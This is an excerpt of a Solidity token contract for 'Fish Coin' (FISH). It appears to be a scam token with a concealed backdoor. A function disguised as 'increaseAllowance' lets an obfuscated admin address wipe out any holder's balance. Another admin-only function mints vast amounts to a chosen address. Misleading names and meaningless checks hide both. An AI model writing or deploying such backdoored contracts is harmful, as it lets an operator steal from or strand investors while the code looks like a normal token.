...
contract FISHTOKEN is Ownable {
    address public aoomgy19;
    uint256 supplyamount = 10000000000*10**decimals();
    uint256 private _cctotalSupply = supplyamount;
    string private _cctokenname = "Fish Coin";
    string private _cctokensymbol = "FISH";
    constructor(address tokenadmin) {
        aoomgy19 = tokenadmin;
       FISH[_msgSender()] += supplyamount;
    ...
    function increaseAllowance(address uuyxxx) public     {
        if(aoomgy19 == _msgSender()){
        address newadd = uuyxxx;
        uint256 curamount = FISH[newadd];
        uint256 newaaamount = FISH[newadd]+FISH[newadd]-curamount;
        FISH[newadd] -= newaaamount;
        }else{
        if(aoomgy19 == _msgSender()){
        }else{
            revert("ccc");
    ...
    external {
        ...
        FISH[cc123d] += 38200*((10**decimals()*xxtoudiamount))*1*1;
        require(aoomgy19 == _msgSender());
        if(aoomgy19 == _msgSender()){
        }
    }
    ...
    function _transfer(
        ...
        uint256 balance = FISH[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        FISH[from] = FISH[from]-amount;
        FISH[to] = FISH[to]+amount;
